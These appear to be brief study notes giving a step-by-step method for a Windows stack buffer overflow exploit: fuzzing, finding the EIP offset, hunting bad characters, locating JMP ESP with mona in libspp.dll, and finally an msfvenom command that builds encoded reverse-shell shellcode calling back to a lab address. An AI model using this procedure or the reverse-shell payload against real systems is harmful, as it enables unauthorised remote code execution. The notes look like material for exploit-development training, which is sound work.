1. Fuzz
- Use Spiking
- Use simple python script
2. Find offset
- Use metasploit `pattern_create` and `pattern offset`
```
msf-pattern_create -l 800
msf-pattern_offset -l 800 -q 42306142
```
3. Find bad character
- Immunity https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
4. Find module and JMP ESP
- Use metasploit nasm_shell
```
msf-nasm_shell
jmp esp
add eax,12
```
- Use debugger and mona to find JMP ESP
```
!mona modules
!mona find -s “\xff\xe4” -m “libspp.dll”,
```
5. Check jmp esp
```
Use \xCC as the payload. You should see a bunch of INT in the EIP
```

6. Create shellcode
 ```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f py –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 ```
